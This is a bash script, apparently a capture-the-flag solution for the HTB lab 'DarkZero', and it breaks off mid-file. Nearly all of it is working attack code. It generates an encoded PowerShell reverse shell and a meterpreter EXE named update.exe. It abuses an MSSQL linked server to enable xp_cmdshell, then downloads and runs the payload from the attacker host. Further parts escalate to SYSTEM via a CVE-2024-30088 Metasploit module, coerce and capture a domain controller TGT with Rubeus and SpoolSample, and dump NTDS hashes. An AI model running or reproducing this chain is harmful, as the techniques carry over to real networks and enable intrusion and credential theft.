#!/usr/bin/env bash
# =============================================================================
#  ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗███████╗██████╗  ██████╗
#  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
#  ██║  ██║███████║██████╔╝█████╔╝   ███╔╝ █████╗  ██████╔╝██║   ██║
#  ██║  ██║██╔══██║██╔══██╗██╔═██╗  ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
#  ██████╔╝██║  ██║██║  ██║██║  ██╗███████╗███████╗██║  ██║╚██████╔╝
#  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝
#
#  HTB Season 10 DarkZero (Hard)
#  Attack Chain: MSSQL Linked Server → CVE-2024-30088 SYSTEM →
#                Forest Trust TGT Delegation Abuse → NTDS Dump → PWNED
#
#  Author : Shadow Junior 😈  (HTB Nepal #3)
#  Usage  : ./darkzero.sh <DC01_IP> [LHOST]
#  Example: ./darkzero.sh 10.129.3.139
# =============================================================================

set -euo pipefail

# ─── COLORS ──────────────────────────────────────────────────────────────────
RED='\033[1;31m';  GREEN='\033[1;32m';  YELLOW='\033[1;33m'
BLUE='\033[1;34m'; CYAN='\033[1;36m';  MAGENTA='\033[1;35m'
WHITE='\033[1;37m'; GRAY='\033[0;37m';  NC='\033[0m'
BOLD='\033[1m';    DIM='\033[2m'

# ─── PHASE LABELS ─────────────────────────────────────────────────────────────
ph()  { echo -e "\n${MAGENTA}╔══[ ${WHITE}PHASE $1${MAGENTA} ]═══════════════════════════════════════════════════${NC}"; }
ok()  { echo -e "${GREEN}  [✓]${NC} $*"; }
inf() { echo -e "${CYAN}  [*]${NC} $*"; }
wrn() { echo -e "${YELLOW}  [!]${NC} $*"; }
err() { echo -e "${RED}  [✗]${NC} $*"; exit 1; }
loot(){ echo -e "${GREEN}  [🚩]${NC}${BOLD} $*${NC}"; }
cmd() { echo -e "${DIM}  ❯ $*${NC}"; }
sep() { echo -e "${GRAY}  ────────────────────────────────────────────────────────${NC}"; }

# ─── BANNER ───────────────────────────────────────────────────────────────────
banner() {
cat <<EOF

${RED}  ╔═══════════════════════════════════════════════════════════╗
  ║          HTB Season 10 DarkZero (Hard)                  ║
  ║      MSSQL → CVE-2024-30088 → Forest Trust Abuse          ║
  ║    Shadow Junior 😈  │  HTB Nepal #3  │  ${YELLOW}PWNING TIME${RED}        ║
  ╚═══════════════════════════════════════════════════════════╝${NC}

EOF
}

# ─── ARGUMENTS & GLOBALS ─────────────────────────────────────────────────────
[[ $# -lt 1 ]] && { banner; echo -e "${YELLOW}Usage: $0 <DC01_IP> [LHOST]${NC}"; exit 1; }

DC01_IP="$1"
DOMAIN="darkzero.htb"
EXT_DOMAIN="darkzero.ext"
DC01_HOSTNAME="DC01.${DOMAIN}"
DC02_HOSTNAME="DC02.${EXT_DOMAIN}"
USERNAME="john.w"
PASSWORD='RFulUtONCOL!'
LINKED_SERVER="DC02.darkzero.ext"
LINKED_LOGIN="dc01_sql_svc"
ADMIN_HASH="5917507bdf2ef2c2b0a869a1cba40726"  # from writeup set dynamically later

# Auto-detect LHOST
if [[ $# -ge 2 ]]; then
    LHOST="$2"
else
    LHOST=$(ip route get 10.10.10.1 2>/dev/null | awk '/src/{print $7}' | head -1)
    [[ -z "$LHOST" ]] && LHOST=$(hostname -I | awk '{print $1}')
fi

# Ports
LPORT_SHELL=9001       # Initial PS reverse shell
LPORT_METER=4444       # Meterpreter handler
HTTP_PORT=8888         # File serving

# Working directory
TS=$(date +%Y%m%d_%H%M%S)
WORKDIR="/tmp/darkzero_${DC01_IP//./_}"
LOOT="$WORKDIR/loot"
TOOLS="$WORKDIR/tools"
TICKETS="$WORKDIR/tickets"
PAYLOADS="$WORKDIR/payloads"
LOGS="$WORKDIR/logs"

# If a previous run was executed with sudo, some generated files may be root-owned.
# Repair ownership once so current non-root run can overwrite artifacts cleanly.
if [[ -d "$WORKDIR" && ! -w "$WORKDIR" ]]; then
    wrn "Existing workdir is not writable: $WORKDIR"
    wrn "Attempting ownership repair via sudo..."
    sudo chown -R "$(id -un):$(id -gn)" "$WORKDIR" || err "Failed to repair workdir permissions"
fi

# Remove stale generated top-level scripts/resources to avoid redirection failures.
if [[ -d "$WORKDIR" ]]; then
    find "$WORKDIR" -maxdepth 1 -type f \
        \( -name "*.rc" -o -name "*.py" -o -name "*.sh" \) \
        -exec rm -f {} + 2>/dev/null || true
fi

mkdir -p "$LOOT" "$TOOLS" "$TICKETS" "$PAYLOADS" "$LOGS"

LOG_FILE="$LOGS/darkzero_${TS}.log"
exec > >(tee -a "$LOG_FILE") 2>&1

banner
inf "Target DC01  : ${WHITE}${DC01_IP}${NC} (${DC01_HOSTNAME})"
inf "Domain       : ${WHITE}${DOMAIN}${NC} ↔ ${WHITE}${EXT_DOMAIN}${NC}"
inf "LHOST        : ${WHITE}${LHOST}${NC}"
inf "Working Dir  : ${WHITE}${WORKDIR}${NC}"
inf "Log File     : ${WHITE}${LOG_FILE}${NC}"

# ─── PID TRACKING ─────────────────────────────────────────────────────────────
PIDS=()
cleanup() {
    echo -e "\n${YELLOW}[!] Cleaning up background processes...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done
    # Kill HTTP server
    pkill -f "python3 -m http.server ${HTTP_PORT}" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

# ─── HELPERS ──────────────────────────────────────────────────────────────────
wait_tcp() {
    local host="$1" port="$2" timeout="${3:-30}" name="${4:-service}"
    inf "Waiting for ${name} at ${host}:${port} (${timeout}s)..."
    local count=0
    while ! (echo >/dev/tcp/"$host"/"$port") 2>/dev/null; do
        sleep 2; count=$((count+2))
        [[ $count -ge $timeout ]] && { wrn "${name} not responding after ${timeout}s"; return 1; }
        echo -ne "${GRAY}  ❯ ${count}s elapsed...\r${NC}"
    done
    ok "${name} is up!"
}

run_sql() {
    # Execute SQL command on DC01 via impacket-mssqlclient (non-interactive)
    python3 "$WORKDIR/mssql_exec.py" "$@"
}

# ─── DEPENDENCY CHECK ─────────────────────────────────────────────────────────
ph "0 Dependency Check"

REQUIRED=(nmap impacket-mssqlclient impacket-secretsdump impacket-ticketConverter
          impacket-wmiexec evil-winrm python3 msfconsole msfvenom base64 curl wget nc)
MISSING=()

for tool in "${REQUIRED[@]}"; do
    if command -v "$tool" &>/dev/null; then
        ok "${tool}"
    else
        wrn "${tool} MISSING"
        MISSING+=("$tool")
    fi
done

if [[ ${#MISSING[@]} -gt 0 ]]; then
    echo ""
    wrn "Missing tools: ${MISSING[*]}"
    wrn "Install with: sudo apt install -y ${MISSING[*]}"
    err "Please install missing dependencies and retry."
fi

# ─── PHASE 1: HOST SETUP + RECON ─────────────────────────────────────────────
ph "1 Host Setup & Reconnaissance"

# /etc/hosts entries
inf "Configuring /etc/hosts..."
for entry in "${DC01_IP} ${DC01_HOSTNAME} ${DOMAIN}" \
             "${DC01_IP} ${DC02_HOSTNAME} ${EXT_DOMAIN}"; do
    HOST_ENTRY="${entry}"
    if ! grep -qF "${DC01_HOSTNAME}" /etc/hosts 2>/dev/null; then
        echo "$HOST_ENTRY" | sudo tee -a /etc/hosts >/dev/null
        ok "Added: $HOST_ENTRY"
    else
        ok "Already present: $HOST_ENTRY"
    fi
done

# Kerberos configuration
inf "Writing /etc/krb5.conf for cross-realm auth..."
sudo tee /etc/krb5.conf >/dev/null <<KRB5
[libdefaults]
    default_realm = DARKZERO.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    noaddresses = true

[realms]
    DARKZERO.HTB = {
        kdc = ${DC01_HOSTNAME}
        admin_server = ${DC01_HOSTNAME}
        default_domain = darkzero.htb
    }
    DARKZERO.EXT = {
        kdc = ${DC02_HOSTNAME}
        admin_server = ${DC02_HOSTNAME}
        default_domain = darkzero.ext
    }

[domain_realm]
    .darkzero.htb = DARKZERO.HTB
    darkzero.htb = DARKZERO.HTB
    .darkzero.ext = DARKZERO.EXT
    darkzero.ext = DARKZERO.EXT
KRB5
ok "krb5.conf written"

# Nmap scan
inf "Running Nmap scan against ${DC01_IP}..."
NMAP_OUT="$LOOT/nmap_full.txt"
nmap -sVC -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389 \
     --open -T4 -oN "$NMAP_OUT" "$DC01_IP" 2>/dev/null
ok "Nmap complete → $NMAP_OUT"

# Print key findings
sep
echo -e "${CYAN}Key Ports:${NC}"
grep -E "^[0-9]+/tcp" "$NMAP_OUT" | grep "open" | while IFS= read -r line; do
    echo -e "  ${GREEN}▶${NC} $line"
done
sep

# ─── PHASE 2: MSSQL PYTHON HELPER ────────────────────────────────────────────
ph "2 MSSQL Automation Helper"

inf "Writing Python MSSQL helper..."
cat > "$WORKDIR/mssql_exec.py" <<'PYEOF'
#!/usr/bin/env python3
"""
Non-interactive MSSQL executor using impacket.
Usage: python3 mssql_exec.py <host> <user> <password> <query> [--linked <server>]
"""
import sys, argparse, time

try:
    from impacket.tds import MSSQL
    from impacket import version
except ImportError:
    print("[!] impacket not installed: pip install impacket --break-system-packages", file=sys.stderr)
    sys.exit(1)

def exec_query(host, user, password, query, linked=None, verbose=True):
    try:
        ms = MSSQL(host, 1433)
        ms.connect()
        # login(database, username, password, domain, hashes, useWindowsAuth)
        ms.login(None, user, password, "darkzero", None, True)  # Windows auth

        if linked:
            # Wrap query for linked server execution
            safe = query.replace("'", "''")
            query = f"EXEC('{safe}') AT [{linked}]"

        ms.sql_query(query)
        ms.printRows()
        result = ms.rows
        ms.disconnect()
        return result
    except Exception as e:
        print(f"[!] SQL Error: {e}", file=sys.stderr)
        return None

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("user")
    ap.add_argument("password")
    ap.add_argument("query")
    ap.add_argument("--linked", default=None)
    args = ap.parse_args()
    exec_query(args.host, args.user, args.password, args.query, args.linked)
PYEOF
chmod +x "$WORKDIR/mssql_exec.py"
ok "MSSQL helper ready"

# ─── PHASE 3: PAYLOAD GENERATION ─────────────────────────────────────────────
ph "3 Payload Generation"

# 3a. PowerShell reverse shell (base64 encoded) for initial access via xp_cmdshell
inf "Generating PowerShell reverse shell (LHOST=${LHOST}:${LPORT_SHELL})..."
PS_RAW="\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT_SHELL});\$stream = \$client.GetStream();\$bytes = New-Object Byte[] 65536;while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){try{\$data = (New-Object Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$out = (iex \$data 2>&1 | Out-String);\$out2 = \$out + 'PS '+(pwd).Path+'> ';\$sb = ([Text.Encoding]::ASCII).GetBytes(\$out2);\$stream.Write(\$sb,0,\$sb.Length);\$stream.Flush()}catch{}};\$client.Close()"
PS_B64=$(echo -n "$PS_RAW" | iconv -t UTF-16LE | base64 -w 0)
echo "powershell -NoP -NonI -W Hidden -Exec Bypass -enc ${PS_B64}" > "$PAYLOADS/ps_revshell.txt"
ok "PowerShell payload: $PAYLOADS/ps_revshell.txt"

# 3b. Meterpreter EXE for CVE-2024-30088
inf "Generating meterpreter x64 payload..."
METER_EXE="$TOOLS/update.exe"
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST="$LHOST" LPORT="$LPORT_METER" \
         -f exe -o "$METER_EXE" --platform windows -a x64 \
         -e x64/xor_dynamic -i 5 \
         2>/dev/null
ok "Meterpreter payload: ${METER_EXE}"

# 3c. Download Rubeus and SpoolSample (precompiled)
inf "Checking for Rubeus.exe and SpoolSample.exe..."

RUBEUS="$TOOLS/Rubeus.exe"
SPOOLSAMPLE="$TOOLS/SpoolSample.exe"

# Try common Kali/HTB paths first
for rpath in /usr/share/windows-resources/rubeus/Rubeus.exe \
             /opt/Rubeus/Rubeus.exe \
             ~/tools/Rubeus.exe \
             ./Rubeus.exe; do
    if [[ -f "$rpath" ]]; then
        cp "$rpath" "$RUBEUS"
        ok "Rubeus found at $rpath"
        break
    fi
done

for spath in /opt/SpoolSample/SpoolSample.exe \
             ~/tools/SpoolSample.exe \
             ./SpoolSample.exe; do
    if [[ -f "$spath" ]]; then
        cp "$spath" "$SPOOLSAMPLE"
        ok "SpoolSample found at $spath"
        break
    fi
done

# Attempt download if not found
if [[ ! -f "$RUBEUS" ]]; then
    wrn "Rubeus.exe not found locally attempting download..."
    # Try GhostPack compiled releases
    wget -q -O "$RUBEUS" \
        "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" \
        2>/dev/null || true
    [[ -f "$RUBEUS" && -s "$RUBEUS" ]] && ok "Rubeus downloaded" \
        || { wrn "Auto-download failed please place Rubeus.exe in: $TOOLS/"; RUBEUS=""; }
fi

if [[ ! -f "$SPOOLSAMPLE" ]]; then
    wrn "SpoolSample.exe not found will use PetitPotam as fallback coercion"
    SPOOLSAMPLE=""
fi

# 3d. PetitPotam as fallback coercer
PETITPOTAM=""
for pp in /opt/PetitPotam/PetitPotam.py \
          ~/tools/PetitPotam.py \
          ./PetitPotam.py; do
    if [[ -f "$pp" ]]; then
        PETITPOTAM="$pp"
        ok "PetitPotam found: $pp"
        break
    fi
done

# 3e. MSF resource script for CVE-2024-30088
inf "Writing Metasploit resource scripts..."

# Handler resource script
cat > "$WORKDIR/handler.rc" <<RC
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT ${LPORT_METER}
set ExitOnSession false
set SessionCommunicationTimeout 0
exploit -j -z
RC

# CVE-2024-30088 privesc resource script (used after getting meter session)
cat > "$WORKDIR/privesc.rc" <<RC
use exploit/windows/local/cve_2024_30088_authz_basep
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT $((LPORT_METER + 1))
set SESSION 1
set AutoCheck true
run
RC

ok "MSF resource scripts written"

# ─── PHASE 4: START INFRASTRUCTURE ───────────────────────────────────────────
ph "4 Infrastructure Setup"

# HTTP server to serve payloads from $TOOLS
inf "Starting HTTP server on port ${HTTP_PORT}..."
cd "$TOOLS"
python3 -m http.server "$HTTP_PORT" >/dev/null 2>&1 &
HTTP_PID=$!
PIDS+=("$HTTP_PID")
cd - >/dev/null
ok "HTTP server PID ${HTTP_PID} → http://${LHOST}:${HTTP_PORT}/"

# Show what's being served
sep
echo -e "${CYAN}Files available for download:${NC}"
ls -la "$TOOLS/" | grep -v "^total" | while IFS= read -r line; do
    echo -e "  ${GREEN}▶${NC} $line"
done
sep

# ─── PHASE 5: MSSQL ENUMERATION ───────────────────────────────────────────────
ph "5 MSSQL Linked Server Enumeration"

inf "Testing MSSQL authentication: ${USERNAME}@${DC01_HOSTNAME}..."
wait_tcp "$DC01_IP" 1433 60 "MSSQL"

# Interactive MSSQL session wrapper using expect or Python
inf "Writing interactive MSSQL automation script..."

cat > "$WORKDIR/mssql_pwn.py" <<'PYEOF'
#!/usr/bin/env python3
"""
Full MSSQL attack automation:
1. Connect to DC01 as john.w (Windows auth)
2. Enumerate linked servers
3. Enable xp_cmdshell on DC02 via linked server
4. Execute PowerShell reverse shell via xp_cmdshell
"""
import sys, time, subprocess, base64, socket, os, threading

try:
    import impacket
except ImportError:
    print("[!] pip install impacket --break-system-packages")
    sys.exit(1)

DC01_IP  = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
LHOST    = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
LPORT    = int(sys.argv[3]) if len(sys.argv) > 3 else 9001
HTTP_PORT= int(sys.argv[4]) if len(sys.argv) > 4 else 8888
METER_PORT = int(sys.argv[5]) if len(sys.argv) > 5 else 4444
LINKED   = "DC02.darkzero.ext"
USERNAME = "john.w"
PASSWORD = "RFulUtONCOL!"
DOMAIN   = "darkzero"
UPDATE_EXE = "update.exe"

RED   = "\033[1;31m"; GREEN = "\033[1;32m"; CYA = "\033[1;36m"
YEL   = "\033[1;33m"; NC    = "\033[0m";     MAG = "\033[1;35m"
ok    = lambda m: print(f"{GREEN}  [✓]{NC} {m}")
inf   = lambda m: print(f"{CYA}  [*]{NC} {m}")
err   = lambda m: print(f"{RED}  [✗]{NC} {m}", file=sys.stderr)

# ── Impacket MSSQL client ──
from impacket.tds import MSSQL as _MSSQL

class SQLClient:
    def __init__(self, host, user, password, domain):
        self.host = host
        self.user = user
        self.password = password
        self.domain = domain
        self._client = None

    def connect(self):
        inf(f"Connecting to {self.host}:1433...")
        self._client = _MSSQL(self.host, 1433)
        self._client.connect()
        ok("TCP connected")
        # login(database, username, password, domain, hashes, useWindowsAuth)
        result = self._client.login(None, self.user, self.password, self.domain, None, True)
        if not result:
            err("Authentication failed!")
            sys.exit(1)
        ok(f"Authenticated as {self.domain}\\{self.user}")

    def query(self, sql, raw=False):
        """Execute SQL, return rows."""
        try:
            self._client.sql_query(sql)
            if not raw:
                self._client.printRows()
            return self._client.rows
        except Exception as e:
            err(f"Query error: {e}")
            return None

    def linked_exec(self, sql, server=None):
        """Execute SQL on linked server."""
        srv = server or LINKED
        # Escape single quotes in the inner query
        escaped = sql.replace("'", "''")
        wrapper = f"EXEC('{escaped}') AT [{srv}]"
        return self.query(wrapper, raw=True)

    def linked_cmd(self, cmd, server=None):
        """Execute OS command on linked server via xp_cmdshell."""
        escaped_cmd = cmd.replace("'", "''")
        sql = f"EXEC xp_cmdshell '{escaped_cmd}'"
        return self.linked_exec(sql, server)

    def disconnect(self):
        if self._client:
            try:
                self._client.disconnect()
            except:
                pass

def build_ps_payload(lhost, lport):
    """Build base64-encoded PowerShell reverse shell."""
    ps = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();"
        "$b=New-Object Byte[] 65536;"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "try{"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$o=(iex $d 2>&1|Out-String);"
        "$o2=$o+'PS '+(pwd).Path+'> ';"
        "$sb=([Text.Encoding]::ASCII).GetBytes($o2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()"
        "}catch{}};"
        "$c.Close()"
    )
    encoded = base64.b64encode(ps.encode('utf-16-le')).decode()
    return f"powershell -NoP -NonI -W Hidden -Exec Bypass -enc {encoded}"

def main():
    print(f"\n{MAG}  ╔══[ MSSQL ATTACK ENGINE ]═══════════════════════════════╗{NC}")

    sql = SQLClient(DC01_IP, USERNAME, PASSWORD, DOMAIN)
    sql.connect()

    # Step 1: Enumerate linked servers
    print(f"\n{CYA}  ─── Linked Server Enumeration ───{NC}")
    sql.query("SELECT name FROM sys.servers")
    sql.query(f"""
        SELECT srv.name AS [Linked Server],
               prin.name AS [Local Login],
               ll.uses_self_credential AS [Is Self Mapping],
               ll.remote_name AS [Remote Login]
        FROM sys.servers srv
        LEFT JOIN sys.linked_logins ll ON srv.server_id = ll.server_id
        LEFT JOIN sys.server_principals prin ON ll.local_principal_id = prin.principal_id
        WHERE srv.name != @@SERVERNAME
    """)

    # Step 2: Enable xp_cmdshell on DC02 via linked server
    print(f"\n{CYA}  ─── Enabling xp_cmdshell on DC02 ───{NC}")

    cmds_enable = [
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
    ]
    for c in cmds_enable:
        inf(f"Running on {LINKED}: {c[:60]}...")
        sql.linked_exec(c)
        time.sleep(0.5)
    ok("xp_cmdshell enabled on DC02")

    # Step 3: Test connectivity whoami
    print(f"\n{CYA}  ─── Testing Command Execution on DC02 ───{NC}")
    sql.linked_cmd("whoami")
    time.sleep(1)

    # Step 4: Download meterpreter payload to DC02
    meter_url = f"http://{LHOST}:{HTTP_PORT}/{UPDATE_EXE}"
    download_cmd = (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass "
        f"-Command \"IWR -Uri '{meter_url}' -OutFile 'C:\\\\Windows\\\\Temp\\\\{UPDATE_EXE}'\""
    )
    inf(f"Downloading meterpreter to DC02 → C:\\Windows\\Temp\\{UPDATE_EXE}")
    inf(f"Download URL: {meter_url}")
    sql.linked_cmd(download_cmd)
    time.sleep(3)

    # Step 5: Verify download
    sql.linked_cmd(f"dir C:\\Windows\\Temp\\{UPDATE_EXE}")
    time.sleep(1)

    # Step 6: Execute meterpreter (background)
    inf(f"Executing meterpreter payload on DC02...")
    exec_cmd = f"cmd /c start /b C:\\Windows\\Temp\\{UPDATE_EXE}"
    sql.linked_cmd(exec_cmd)
    ok("Meterpreter execution triggered on DC02")
    ok(f"Waiting for callback on {LHOST}:{METER_PORT}...")

    # Step 7: Also send PowerShell reverse shell as backup
    ps_payload = build_ps_payload(LHOST, LPORT)
    inf(f"Sending PS reverse shell as backup on port {LPORT}...")
    sql.linked_cmd(ps_payload)

    sql.disconnect()
    ok("MSSQL session complete")
    print(f"\n  {GREEN}→ Check your listeners on ports {LPORT} (PS shell) and {METER_PORT} (meterpreter){NC}\n")

if __name__ == "__main__":
    main()
PYEOF
chmod +x "$WORKDIR/mssql_pwn.py"
ok "MSSQL attack script ready"

# ─── PHASE 6: METASPLOIT FULL AUTOMATION ──────────────────────────────────────
ph "6 Metasploit Full Automation Script"

inf "Writing comprehensive MSF automation resource script..."

cat > "$WORKDIR/darkzero_msf.rc" <<MSFRC
# ============================================================
# DarkZero HTB Full Metasploit Automation Resource Script
# Stage 1: Multi-handler (catch meterpreter from DC02)
# Stage 2: CVE-2024-30088 privesc → SYSTEM
# Stage 3: hashdump DC02
# Stage 4: Upload tools (Rubeus, SpoolSample)
# Stage 5: Rubeus monitor + SpoolSample coerce
# Stage 6: Download kirbi ticket
# ============================================================

spool ${LOGS}/msf_session.log

# ── Stage 1: Start listener for meterpreter ──
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT ${LPORT_METER}
set ExitOnSession false
set SessionCommunicationTimeout 300
set SessionRetryTotal 5
exploit -j -z

# ── Stage 2: Wait for session then escalate ──
# (Interactive run 'sessions' to check, then run privesc.rc)
echo "[*] Waiting 60s for meterpreter callback..."
sleep 60
sessions

use exploit/windows/local/cve_2024_30088_authz_basep
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT $((LPORT_METER + 1))
set SESSION 1
set AutoCheck true
set AutoRunScript multi_console_command -rc ${WORKDIR}/post_system.rc
run

MSFRC

# Post-SYSTEM resource script
cat > "$WORKDIR/post_system.rc" <<POSTRC
# Post-exploitation after SYSTEM on DC02
echo "[*] Running post-exploitation on DC02 SYSTEM session..."

# Get session info
sessions -v

# hashdump DC02
use post/windows/gather/hashdump
set SESSION 2
run

# Upload Rubeus
upload ${TOOLS}/Rubeus.exe C:\\\\Windows\\\\Temp\\\\r.exe

# Upload SpoolSample
upload ${TOOLS}/SpoolSample.exe C:\\\\Windows\\\\Temp\\\\SpoolSample.exe

echo "[+] Tools uploaded. Now run interactively:"
echo "    sessions -i 2"
echo "    execute -f 'cmd.exe' -a '/c C:\\Windows\\Temp\\r.exe monitor /interval:5 /nowrap > C:\\Windows\\Temp\\tix.txt'"
echo "    (new terminal) execute SpoolSample.exe DC01.darkzero.htb DC02.darkzero.ext"

POSTRC

ok "MSF resource scripts written"

# ─── PHASE 7: RUBEUS + COERCION AUTOMATION ───────────────────────────────────
ph "7 TGT Capture Automation"

inf "Writing Rubeus monitor + ticket extraction script..."

cat > "$WORKDIR/capture_tgt.sh" <<'CAPSH'
#!/usr/bin/env bash
# ==========================================================
# capture_tgt.sh Run INSIDE a DC02 SYSTEM shell context
# Automates: Rubeus monitor → SpoolSample coerce → capture TGT
# ==========================================================
RED='\033[1;31m'; GREEN='\033[1;32m'; CYA='\033[1;36m'; NC='\033[0m'

DC01_HOST="${1:-DC01.darkzero.htb}"
DC02_HOST="${2:-DC02.darkzero.ext}"
WORKDIR="${3:-/tmp}"
TICKET_DIR="${WORKDIR}/tickets"
mkdir -p "$TICKET_DIR"

ok()  { echo -e "${GREEN}  [✓]${NC} $*"; }
inf() { echo -e "${CYA}  [*]${NC} $*"; }
wrn() { echo -e "${RED}  [!]${NC} $*"; }

# Commands to run on DC02 SYSTEM shell via meterpreter
# These are the actual PowerShell commands
inf "=== TGT CAPTURE PHASE ==="
inf "Run the following commands in your SYSTEM shell on DC02:"
echo ""
echo "─────────────────────────────────────────────────────"
echo "# Terminal 1 (DC02 SYSTEM shell) Start Rubeus monitor:"
echo 'C:\Windows\Temp\r.exe monitor /interval:5 /nowrap > C:\Windows\Temp\tix.txt'
echo ""
echo "# Terminal 2 (DC02 SYSTEM shell) Trigger SpoolSample:"
echo 'C:\Windows\Temp\SpoolSample.exe DC01.darkzero.htb DC02.darkzero.ext'
echo ""
echo "# Or PetitPotam (if SpoolSample unavailable):"
echo "# python3 PetitPotam.py -u john.w -p 'RFulUtONCOL!' DC02.darkzero.ext DC01.darkzero.htb"
echo ""
echo "# After capture, download tix.txt from DC02:"
echo 'download C:\Windows\Temp\tix.txt'
echo "─────────────────────────────────────────────────────"
CAPSH
chmod +x "$WORKDIR/capture_tgt.sh"

# Ticket parser
cat > "$WORKDIR/parse_ticket.py" <<'PYEOF'
#!/usr/bin/env python3
"""
parse_ticket.py Extract base64 TGT from Rubeus monitor output.
Usage: python3 parse_ticket.py <rubeus_output_file> <output_dir>
"""
import sys, re, base64, os, subprocess

def parse_rubeus_output(filepath, outdir):
    RED = "\033[1;31m"; GRE = "\033[1;32m"; CYA = "\033[1;36m"; NC = "\033[0m"
    ok  = lambda m: print(f"{GRE}  [✓]{NC} {m}")
    inf = lambda m: print(f"{CYA}  [*]{NC} {m}")
    err = lambda m: print(f"{RED}  [✗]{NC} {m}")

    with open(filepath, 'r', errors='ignore') as f:
        content = f.read()

    print(f"\n  Parsing Rubeus output: {filepath}\n")

    # Find all TGT blocks
    # Pattern: User: DC01$@DARKZERO.HTB followed by Base64EncodedTicket
    tgt_blocks = re.findall(
        r'User\s*:\s*(DC01\$@DARKZERO\.HTB.*?)(?=\[\*\] \d+/|\Z)',
        content, re.DOTALL | re.IGNORECASE
    )

    if not tgt_blocks:
        # Try broader pattern any TGT with forwarded flag
        tgt_blocks = re.findall(
            r'User\s*:\s*(DC01.*?)(?=\[\*\]|\Z)',
            content, re.DOTALL | re.IGNORECASE
        )

    if not tgt_blocks:
        err("No DC01$ TGT found in output. Looking for any ticket...")
        # Last resort any base64 block
        b64_blocks = re.findall(
            r'Base64EncodedTicket\s*:\s*\n\s*([A-Za-z0-9+/=\s]+)',
            content, re.DOTALL
        )
        if b64_blocks:
            for i, b in enumerate(b64_blocks):
                b64_clean = b.replace('\n', '').replace(' ', '').strip()
                print(f"  Found ticket block {i+1}: {b64_clean[:50]}...")
                save_ticket(b64_clean, outdir, f"ticket_{i+1}")
        else:
            err("No tickets found at all!")
            sys.exit(1)
        return

    for i, block in enumerate(tgt_blocks):
        # Extract user
        user_m = re.search(r'User\s*:\s*(\S+)', block)
        user = user_m.group(1) if user_m else f"unknown_{i}"

        # Check for forwarded flag (required for TGT delegation)
        if 'forwarded' in block.lower():
            ok(f"Found FORWARDABLE TGT: {user}")
        else:
            inf(f"Found TGT (non-forwarded): {user}")

        # Extract base64 ticket
        b64_m = re.search(r'Base64EncodedTicket\s*:\s*\n?\s*([A-Za-z0-9+/=\s]{50,})', block, re.DOTALL)
        if b64_m:
            b64 = b64_m.group(1).replace('\n', '').replace(' ', '').strip()
            save_ticket(b64, outdir, f"dc01_tgt_{i+1}")
        else:
            err(f"No Base64 ticket in block for {user}")

def save_ticket(b64_ticket, outdir, name):
    GRE = "\033[1;32m"; CYA = "\033[1;36m"; NC = "\033[0m"
    ok  = lambda m: print(f"{GRE}  [✓]{NC} {m}")
    inf = lambda m: print(f"{CYA}  [*]{NC} {m}")

    kirbi_path = os.path.join(outdir, f"{name}.kirbi")
    ccache_path = os.path.join(outdir, f"{name}.ccache")

    # Decode and save kirbi
    ticket_bytes = base64.b64decode(b64_ticket)
    with open(kirbi_path, 'wb') as f:
        f.write(ticket_bytes)
    ok(f"Saved kirbi: {kirbi_path}")

    # Convert to ccache
    inf(f"Converting kirbi → ccache...")
    result = subprocess.run(
        ['impacket-ticketConverter', kirbi_path, ccache_path],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        ok(f"Converted to ccache: {ccache_path}")
        print(f"\n  Run: export KRB5CCNAME={ccache_path}")
        print(f"  Run: impacket-secretsdump 'DC01$'@DC01.darkzero.htb -k -no-pass\n")
    else:
        print(f"  Converter output: {result.stdout} {result.stderr}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 parse_ticket.py <rubeus_tix.txt> <output_dir>")
        sys.exit(1)
    parse_rubeus_output(sys.argv[1], sys.argv[2])
PYEOF
chmod +x "$WORKDIR/parse_ticket.py"
ok "TGT capture scripts ready"

# ─── PHASE 8: NTDS DUMP + FLAG RETRIEVAL ──────────────────────────────────────
ph "8 NTDS Dump + Flag Retrieval Script"

cat > "$WORKDIR/get_flags.sh" <<FLAGSH
#!/usr/bin/env bash
# ============================================================
# get_flags.sh Post-TGT-capture automation
# Run after collecting DC01\$ TGT from Rubeus
# Usage: ./get_flags.sh <rubeus_tix.txt>
# ============================================================
RED='\033[1;31m'; GREEN='\033[1;32m'; CYA='\033[1;36m'
YEL='\033[1;33m'; MAG='\033[1;35m';   NC='\033[0m'
ok()   { echo -e "\${GREEN}  [✓]\${NC} \$*"; }
inf()  { echo -e "\${CYA}  [*]\${NC} \$*"; }
